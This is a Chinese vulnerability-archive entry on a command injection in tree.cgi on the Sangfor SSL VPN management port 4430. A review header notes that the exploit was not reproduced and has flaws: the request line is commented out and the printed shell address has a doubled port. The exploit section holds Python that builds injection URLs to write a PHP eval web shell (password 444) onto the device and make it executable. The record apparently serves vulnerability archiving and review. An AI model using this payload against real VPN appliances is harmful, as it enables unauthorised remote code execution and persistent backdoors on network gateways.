---
source: "历史归档批(无原始出处标注)"
id: "vw-b4920064fcf5bd3a12b43e3f"
entity_id: "ve-b4920064fcf5bd3a12b43e3f"
schema_version: "1"
title: "深信服SSL VPN 4430 管理端口getshell"
product: "Sangfor SSL VPN管理4430"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "管理端口可达；版本/鉴权未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%204430%20%E7%AE%A1%E7%90%86%E7%AB%AF%E5%8F%A3getshell.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
---

# 深信服SSL VPN 4430 管理端口getshell

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor SSL VPN管理4430
- 本文讨论：tree.cgi a参数命令注入候选
- 版本、权限与配置前提：管理端口可达；版本/鉴权未知
- 资料类型：URL生成脚本非完整利用；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 唯一urlopen被注释，脚本仅打印URL并不发送/验证
- 输出shell地址target含端口又拼:4430，变成双端口；嵌套单引号载荷与外层引号冲突需原源核对
- 无来源/安全版本

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 认证和版本、实际可执行字节/路径待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->




## EXP

```
from urllib.parse import quote
import urllib.request
import ssl


def cmdinject(ip,cmd):
    cmd = cmd.replace(' ','${IFS}')
    url = f"https://{ip}/cgi-bin/tree.cgi?a=';{cmd};'a"
    print(url)
    context = ssl._create_unverified_context()
    #request = urllib.request.urlopen(url=url,context=context)



def GetRootShell(target_ip):
    cmd = "echo -n -e '<?php\\neval($_POST[444]);?>'>/etc/db/svpnrcico/TEST.php"
    cmdinject(target_ip,cmd)
    cmd = "chmod 755 /etc/db/svpnrcico/TEST.php"
    cmdinject(target_ip,cmd)
    print("shell : https://"+target_ip.replace('4430','443')+':4430/com/svpnrcico/TEST.php pass:444')


target_ip = 'x.x.x.x:4430'

GetRootShell(target_ip)
```

